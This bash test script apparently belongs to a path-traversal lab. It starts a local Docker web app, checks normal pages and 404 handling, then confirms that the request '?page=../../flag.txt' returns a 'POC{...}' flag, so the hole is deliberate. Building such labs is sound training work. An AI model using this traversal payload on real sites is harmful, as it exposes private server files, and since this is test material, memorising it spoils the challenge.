#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
trap "$DC down" EXIT
sleep 3

# 1. Home page responds
OUT=$(curl -sf "http://localhost:8080/")
if echo "$OUT" | grep -q "about"; then
  echo "[+] PASS: home page responds"
else
  echo "[-] FAIL: home page: $OUT"; exit 1
fi

# 2. Legitimate page loads
OUT=$(curl -sf "http://localhost:8080/?page=about.txt")
if echo "$OUT" | grep -qi "welcome\|site\|who we are"; then
  echo "[+] PASS: about.txt loads"
else
  echo "[-] FAIL: about.txt: $OUT"; exit 1
fi

# 3. Missing page returns 404
STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:8080/?page=missing.txt")
if [ "$STATUS" = "404" ]; then
  echo "[+] PASS: missing page returns 404"
else
  echo "[-] FAIL: missing page returned $STATUS"; exit 1
fi

# 4. Path traversal reads flag
OUT=$(curl -sf "http://localhost:8080/?page=../../flag.txt")
if echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  echo "[+] PASS: path traversal captured flag"
else
  echo "[-] FAIL: traversal: $OUT"; exit 1
fi

# 5. No flag on clean request
OUT=$(curl -sf "http://localhost:8080/?page=contact.txt")
if echo "$OUT" | grep -qE 'POC\{'; then
  echo "[-] FAIL: flag returned on clean request"; exit 1
else
  echo "[+] PASS: no flag on clean request"
fi

echo "[+] All tests passed"
